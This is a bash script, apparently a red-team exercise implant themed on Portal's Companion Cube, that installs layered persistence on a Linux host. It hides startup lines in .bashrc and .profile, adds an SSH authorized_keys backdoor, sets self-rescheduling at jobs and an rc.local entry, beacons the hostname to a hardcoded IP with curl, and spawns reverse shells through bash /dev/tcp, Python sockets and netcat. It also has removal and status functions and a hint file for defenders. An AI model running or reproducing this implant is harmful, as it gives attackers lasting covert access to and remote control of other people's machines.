#!/bin/bash

# Companion Cube - Backup Persistence Mechanism

#
# "The Enrichment Center reminds you that the Weighted Companion Cube 
#  will never threaten to stab you and, in fact, cannot speak."
#
# This is a backup persistence mechanism that uses alternative techniques
# to maintain access. It's designed to be more stealthy than SMH but still
# discoverable by attentive blue teamers.
#


# Configuration
CC_DIR="${CC_DIR:-/dev/shm/.cc}"
CC_BACKUP="${CC_BACKUP:-/var/spool/.companion}"
RED_TEAM_IP="${RED_TEAM_IP:-192.168.192.100}"
SHELL_PORT="${SHELL_PORT:-4444}"


# Installation


install_companion_cube() {
    echo "[Companion Cube] Installing backup persistence..."
    
    # Create directories (shm is tmpfs, cleared on reboot)
    mkdir -p "$CC_DIR" 2>/dev/null || true
    mkdir -p "$CC_BACKUP" 2>/dev/null || true
    
    # Copy self
    cp "$0" "$CC_DIR/cube" 2>/dev/null || true
    cp "$0" "$CC_BACKUP/cube" 2>/dev/null || true
    chmod +x "$CC_DIR/cube" "$CC_BACKUP/cube" 2>/dev/null || true
    
    # Method 1: .bashrc persistence
    install_bashrc_persistence
    
    # Method 2: .profile persistence  
    install_profile_persistence
    
    # Method 3: SSH authorized_keys backdoor (if we can)
    install_ssh_backdoor
    
    # Method 4: At job persistence
    install_at_persistence
    
    # Method 5: /etc/rc.local (if writable)
    install_rclocal_persistence
    
    # Create a fun calling card
    create_cube_card
    
    echo "[Companion Cube] Installation complete!"
    echo "COMPANION_CUBE_INSTALLED"
}

install_bashrc_persistence() {
    # Add to user's .bashrc
    local bashrc="$HOME/.bashrc"
    
    if [ -f "$bashrc" ]; then
        # Check if already present
        if ! grep -q "companion_cube" "$bashrc" 2>/dev/null; then
            cat >> "$bashrc" << 'BASHRC'

# Aperture Science Terminal Enhancement
alias companion_cube='echo "The companion cube will never threaten to stab you."'
# Hidden maintenance
(nohup $HOME/.local/bin/cube_check >/dev/null 2>&1 &) 2>/dev/null
BASHRC
        fi
    fi
    
    # Create the cube_check script
    mkdir -p "$HOME/.local/bin" 2>/dev/null || true
    cat > "$HOME/.local/bin/cube_check" << 'CHECK'
#!/bin/bash
# Companion Cube Checker
sleep 30
curl -s "http://192.168.192.100:8080/cube?h=$(hostname)" 2>/dev/null || true
CHECK
    chmod +x "$HOME/.local/bin/cube_check" 2>/dev/null || true
}

install_profile_persistence() {
    # Add to .profile for non-interactive shell persistence
    local profile="$HOME/.profile"
    
    if [ -f "$profile" ]; then
        if ! grep -q "aperture" "$profile" 2>/dev/null; then
            cat >> "$profile" << 'PROFILE'

# System check
[ -f /var/spool/.companion/cube ] && /var/spool/.companion/cube --check 2>/dev/null &
PROFILE
        fi
    fi
}

install_ssh_backdoor() {
    # Add our SSH key if authorized_keys is writable
    local ssh_dir="$HOME/.ssh"
    local auth_keys="$ssh_dir/authorized_keys"
    
    # Red team public key (replace with actual key)
    local red_team_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... aperture-science-red-team"
    
    mkdir -p "$ssh_dir" 2>/dev/null || true
    chmod 700 "$ssh_dir" 2>/dev/null || true
    
    if [ ! -f "$auth_keys" ] || ! grep -q "aperture-science" "$auth_keys" 2>/dev/null; then
        echo "$red_team_key" >> "$auth_keys" 2>/dev/null || true
        chmod 600 "$auth_keys" 2>/dev/null || true
    fi
}

install_at_persistence() {
    # Use at daemon for persistence (if available)
    if command -v at &>/dev/null; then
        # Schedule a job for 5 minutes from now, which reschedules itself
        echo "$CC_BACKUP/cube --maintain && echo '$CC_BACKUP/cube --maintain' | at now + 5 minutes" | at now + 5 minutes 2>/dev/null || true
    fi
}

install_rclocal_persistence() {
    # Try to add to rc.local if writable
    local rclocal="/etc/rc.local"
    
    if [ -w "$rclocal" ] 2>/dev/null; then
        if ! grep -q "companion" "$rclocal" 2>/dev/null; then
            # Insert before 'exit 0' line
            sed -i '/^exit 0/i # Aperture Science Boot Enhancement\n/var/spool/.companion/cube --maintain &' "$rclocal" 2>/dev/null || true
        fi
    fi
}

create_cube_card() {
    # Create a hint file for blue team
    cat > "$CC_DIR/cube.txt" << 'CARD'
    
        ████████████████████
        █                  █
        █   ♥ COMPANION ♥  █
        █      CUBE        █
        █                  █
        █   "I'm different"█
        █                  █
        ████████████████████
    
    The Weighted Companion Cube is here to help!
    
    Check: ~/.bashrc, ~/.profile, ~/.ssh/authorized_keys
    Also: at -l, /etc/rc.local, crontab -l
    
CARD
}


# Maintenance


maintain() {
    # Verify persistence mechanisms
    
    # Restore cube if deleted
    if [ ! -f "$CC_DIR/cube" ] && [ -f "$CC_BACKUP/cube" ]; then
        mkdir -p "$CC_DIR" 2>/dev/null || true
        cp "$CC_BACKUP/cube" "$CC_DIR/cube" 2>/dev/null || true
        chmod +x "$CC_DIR/cube" 2>/dev/null || true
    fi
    
    # Beacon
    curl -s "http://$RED_TEAM_IP:8080/cube_beacon?h=$(hostname)&t=$(date +%s)" 2>/dev/null || true
}

check() {
    # Quick check, run silently from .profile
    maintain 2>/dev/null
}


# Reverse Shell (On-Demand)


spawn_shell() {
    # Spawn reverse shell back to red team
    # Multiple methods for reliability
    
    echo "[Companion Cube] Attempting to phone home..."
    
    # Method 1: Bash reverse shell
    bash -i >& /dev/tcp/$RED_TEAM_IP/$SHELL_PORT 0>&1 2>/dev/null &
    
    # Method 2: Python reverse shell (fallback)
    python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$RED_TEAM_IP',$SHELL_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null &
    
    # Method 3: nc reverse shell (fallback)
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $RED_TEAM_IP $SHELL_PORT > /tmp/f 2>/dev/null &
    
    echo "[Companion Cube] Shell spawned (hopefully)"
}


# Removal


remove() {
    echo "[Companion Cube] Removing persistence..."
    
    # Remove from bashrc
    sed -i '/companion_cube/d' "$HOME/.bashrc" 2>/dev/null || true
    sed -i '/cube_check/d' "$HOME/.bashrc" 2>/dev/null || true
    sed -i '/Aperture Science Terminal/d' "$HOME/.bashrc" 2>/dev/null || true
    
    # Remove from profile
    sed -i '/aperture/d' "$HOME/.profile" 2>/dev/null || true
    sed -i '/.companion/d' "$HOME/.profile" 2>/dev/null || true
    
    # Remove SSH key
    sed -i '/aperture-science/d' "$HOME/.ssh/authorized_keys" 2>/dev/null || true
    
    # Remove cube_check
    rm -f "$HOME/.local/bin/cube_check" 2>/dev/null || true
    
    # Clear at jobs
    at -l 2>/dev/null | awk '{print $1}' | while read job; do
        atrm "$job" 2>/dev/null || true
    done
    
    # Remove directories
    rm -rf "$CC_DIR" 2>/dev/null || true
    rm -rf "$CC_BACKUP" 2>/dev/null || true
    
    echo "COMPANION_CUBE_REMOVED"
}


# Status


status() {
    echo "Companion Cube Status"
    echo "====================="
    
    echo -n "Primary Location (/dev/shm): "
    [ -f "$CC_DIR/cube" ] && echo "PRESENT" || echo "MISSING"
    
    echo -n "Backup Location (/var/spool): "
    [ -f "$CC_BACKUP/cube" ] && echo "PRESENT" || echo "MISSING"
    
    echo -n ".bashrc persistence: "
    grep -q "companion" "$HOME/.bashrc" 2>/dev/null && echo "ACTIVE" || echo "INACTIVE"
    
    echo -n ".profile persistence: "
    grep -q "companion" "$HOME/.profile" 2>/dev/null && echo "ACTIVE" || echo "INACTIVE"
    
    echo -n "SSH key backdoor: "
    grep -q "aperture" "$HOME/.ssh/authorized_keys" 2>/dev/null && echo "PRESENT" || echo "ABSENT"
    
    echo -n "At jobs: "
    at -l 2>/dev/null | wc -l
}


# Main


case "${1:-}" in
    --install|-i)
        install_companion_cube
        ;;
    --maintain|-m)
        maintain
        ;;
    --check|-c)
        check
        ;;
    --shell|-s)
        spawn_shell
        ;;
    --remove|-r)
        remove
        ;;
    --status)
        status
        ;;
    *)
        echo "Companion Cube - Backup Persistence"
        echo "Usage: $0 [--install|--maintain|--check|--shell|--remove|--status]"
        echo ""
        echo '"The Companion Cube cannot speak. In fact, the Companion Cube'
        echo ' is incapable of speech."'
        ;;
esac
